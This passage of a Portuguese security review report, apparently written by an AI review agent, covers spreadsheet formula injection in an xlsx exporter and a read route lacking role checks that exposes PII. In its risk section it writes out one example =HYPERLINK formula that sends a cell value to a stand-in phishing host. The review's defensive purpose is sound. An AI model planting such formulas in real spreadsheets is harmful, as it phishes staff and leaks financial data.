  > `RelatorioExportService.celulasExcecao` (`src/backend/domain/service/permutas/RelatorioExportService.ts:448-466`) escreve `excecao.justificativa` e `excecao.criadoPor` crus nas células do `.xlsx`. O Zod na rota (`permutas.ts:169-171`) valida só tamanho (10–500 chars), não restringe o primeiro caractere — um analista `admin` pode redigir uma justificativa começando com `=`/`+`/`-`/`@`/`\t`/`\r` que, ao ser aberta por outra analista em Excel/LibreOffice (ou reexportada como CSV), vira hyperlink ativo / fórmula. O exportador de adiantamentos é o canal de comunicação para stakeholders fora do painel (D5 da ADR-0047), então é justamente o vetor útil de phishing dirigido a analistas financeiras.

- **Melhoria Proposta**
  > Adicionar um helper `escapeSpreadsheetFormula(text: string | null): string | null` em `RelatorioExportService` (ou em `src/backend/domain/libs/spreadsheet/escape.ts` para reuso — o exportador de contas-a-pagar tem o mesmo risco em qualquer célula que carregue texto livre). Regra OWASP: se o valor começar com `=`, `+`, `-`, `@`, `\t` ou `\r`, prefixar com `'` (apóstrofo). Aplicar em `excecaoJustificativa` e `excecaoAutor` (2 células); estender depois para `Observação` da alocação manual e demais colunas de texto livre no mesmo exportador. Acompanhar com teste em `RelatorioExportService.test.ts`: justificativa começando com cada um dos 6 caracteres → célula final começa com `'`. Tactic: **Validate Input** (output-side).

- **Resultado Esperado**
  > Todo texto de usuário que atravessa o xlsx passa por escape. Ao abrir o `.xlsx` em Excel/LibreOffice, células perigosas mostram o texto literal (com apóstrofo escondido do usuário) em vez de virar link ativo ou fórmula. Contagem de células cruas: **2 → 0**. Nenhum teste com prefixo `=`/`+`/`-`/`@` na justificativa **hoje → 6 (um por caractere)**.

- **Tactic alvo**: Validate Input (defesa-em-profundidade de saída)
- **Severidade**: P1
- **Esforço estimado**: S (≤1d)
- **Findings relacionados**: F-security-1
- **Métricas de sucesso**:
  - Células com texto de usuário sanitizadas / total: 0/2 → 2/2
  - Testes com prefixo de fórmula na justificativa: 0 → 6 (`=`, `+`, `-`, `@`, `\t`, `\r`)
  - Reuso do helper por outros exportadores (contas-a-pagar, sispag): 0 → ≥ 1 exportador migrado como follow-up
- **Risco de não fazer**: em 6 meses o uso da exceção manual escala (o próprio ADR-0047 prevê reabrir alternativa (a) se o uso crescer). Cada nova exceção é redigida por um analista `admin` diferente; basta um mal-intencionado (ou um analista comprometido) redigir `=HYPERLINK("http://phishing/x?adto="&A2,"Ver o motivo real")` para que a próxima destinatária do relatório, ao abrir no Excel corporativo, veja um link legítimo assinado por uma colega — com o `docCod` do adto real (R$ 20 mi) como isca. Custo de mitigação é 3 linhas.
- **Dependências**: nenhuma (helper local; feature-flag desnecessária)

### [security-2] Fechar o débito pré-existente de leitura sem RBAC de `GET /permutas/gestao` à luz da expansão do payload (delta acrescenta `excecaoManual.justificativa` texto livre + `excecaoManual.criadoPor` email do analista)

- **Problema**
  > `GET /permutas/gestao` (`src/backend/routes/permutas.ts:518-526`) devolve 200 para qualquer autenticado — débito pré-existente formalizado como card `[security-1]` da ADR-0043 e reaberto como `[security-2]` no ciclo `2026-09-15-0207-permutas-saldo-ordem-centavos`. Este delta amplia a projeção com **dois campos novos PII**: `excecaoManual.justificativa` (texto livre 10–500 chars — pode carregar nomes, valores em BRL, referências internas) e `excecaoManual.criadoPor` (pode ser email do analista quando o JWT não tem `sub`; email é PII sob LGPD). Enquanto o card pré-existente não fecha, cada nova feature agrava marginalmente a mesma exposição — este ciclo acrescenta os campos mais novos e menos previsíveis (texto livre).

- **Melhoria Proposta**
  > Fechar o card pré-existente com **uma** das duas opções, referenciando D5 da ADR-0047 no texto: (a) ADR curta declarando que `/permutas/gestao` é intencionalmente aberta a qualquer `role=authenticated` — assinada pelo product owner, com lista explícita dos campos expostos (incluindo os novos `excecaoManual.{justificativa,criadoPor}`); (b) aplicar `requireRole('admin', 'analyst')` na rota, gateando de uma vez as 3 classes que carregam `alocacoes[]` (adicionadas em `2026-09-15-0207`) mais as 2 classes que carregam `excecaoManual` (adicionadas neste delta). Tactic: **Authorize Actors + Limit Access**.

- **Resultado Esperado**
  > Política documentada por ADR OU gateada por role. Rotas de leitura sensíveis sem RBAC e sem ADR: 1 → 0 (ou 1 com ADR). Campos PII expostos ao role `viewer`: **2 novos** (`excecaoManual.justificativa`, `excecaoManual.criadoPor`) → 0 se a opção (b) for escolhida.

- **Tactic alvo**: Authorize Actors + Limit Access
- **Severidade**: P2
- **Esforço estimado**: S (≤1d) — fechamento do card pré-existente
- **Findings relacionados**: F-security-7
- **Métricas de sucesso**:
  - Rotas de leitura sensíveis sem RBAC e sem ADR: 1 → 0
  - ADR referenciando D5 da ADR-0047: 0 → 1 (opção a) OU role check na rota (opção b)
  - Campos PII no payload de `/gestao` acessíveis a `viewer`: N atual → 0 (se opção b) OU N documentado (se opção a)
- **Risco de não fazer**: o padrão continua — cada Regis-Review reabre o mesmo achado com um payload marginalmente maior. Em 6 meses, `/gestao` acumula justificativas livres de N clientes marcadas por M analistas, todas acessíveis a qualquer usuário autenticado, sem revisão de política. A decisão fica postergada e o débito acumula PII.
- **Dependências**: `[security-1]` do ADR-0043 (`fix/permuta-snapshot-estados`) e `[security-2]` do ciclo `2026-09-15-0207-permutas-saldo-ordem-centavos` — os três dependem da mesma decisão (ADR ou role).

## 6. Notas do agente

- **Escopo estrito ao delta.** O `security-2` deste ciclo é continuação direta do card homônimo de `2026-09-15-0207` (que por sua vez continua o `[security-1]` do ADR-0043). Não classificado como P0/P1 novo porque a regressão é marginal (mesma rota, +2 campos PII). Se o débito pré-existente não fechar, o próximo Regis-Review dessa família repete o mesmo card com outro campo.
- **F-security-1 (xlsx formula) é o achado central do delta.** Classificado P1 (não P0) porque ExcelJS em `addRow(string)` grava célula como inline-string (Excel não avalia como fórmula na abertura direta). Blast-radius fica em fluxos "Save as CSV", "Data > Import" e LibreOffice — real, documentado por OWASP, mas mediado pela cadeia de conversão. Métrica de baseline objetiva: 0/2 células escapadas. Parent explicitamente flagou como preocupação.
- **Cross-QA:**
  - *Verify Message Integrity* (F-security-2 + F-security-6) — o contrato "autor só do JWT, 401 sem identidade" + trava otimista `reclassificarAdiantamento` é insumo do agent **Fault Tolerance** (idempotência + concorrência) e do **Integrability** (fronteira JWT → domínio, sem `?? 'unknown'`).
  - *Audit Trail* (F-security-5) — soft-delete com CHECK `remocao_pareada` overlap com **Fault Tolerance** (trilha imutável) e **Modifiability** (nenhum caminho DELETE via aplicação — o modelo é aditivo).
  - *Limit Access* (F-security-7) — overlap com **Availability** (blast-radius do payload de `/gestao` cresce com o uso da exceção) e com o cross-QA já flagado no ciclo `2026-09-15-0207` (`alocacoes[]` em `ja-permutado`).
  - *Validate Input* (F-security-1) — o helper `escapeSpreadsheetFormula` sugerido é reusável por **Integrability** (contas-a-pagar, sispag) — cross-check com o próximo Regis-Review desses módulos.
- **Métricas que tentei coletar e falhei:** `npm audit` (modo `--quick`), IAM/CloudTrail (repo não tem `infra/`).
